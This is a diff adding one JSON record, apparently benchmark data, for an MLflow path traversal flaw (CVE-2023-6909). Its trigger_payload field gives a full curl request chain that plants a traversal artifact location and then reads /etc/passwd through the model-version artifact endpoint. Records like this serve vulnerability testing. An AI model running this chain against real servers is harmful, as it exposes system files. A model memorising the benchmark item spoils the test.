@@ -1,0 +1,15 @@
+{
+  "file_id": "171_mlflow_huntr_11209efb-0f84-482f-add0-587ea6b7e850",
+  "numeric_id": "171",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal vulnerability due to improper URI parsing and local path conversion in MLflow",
+  "cve": "CVE-2023-6909",
+  "cwe": "CWE-29: Path Traversal",
+  "library": "mlflow",
+  "affected_version": ">= 2.7.1",
+  "vulnerable_function": "local_file_uri_to_path",
+  "triggerability": "direct",
+  "trigger_payload": "mlflow ui --host 127.0.0.1:5000\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"http:///?/../../../../../../../../../../../../../../etc/\"}' {BASE_URL}/api/2.0/experiments/create\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}' {BASE_URL}/api/2.0/runs/create\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' {BASE_URL}/api/2.0/model-versions/create\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\"}' {BASE_URL}/api/2.0/model-versions/create\n\ncurl '{BASE_URL}/model-versions/get-artifact?path=passwd&name=poc&version=1'",
+  "oracle": "The server returns the content of /etc/passwd when querying the model version artifact endpoint"
+}
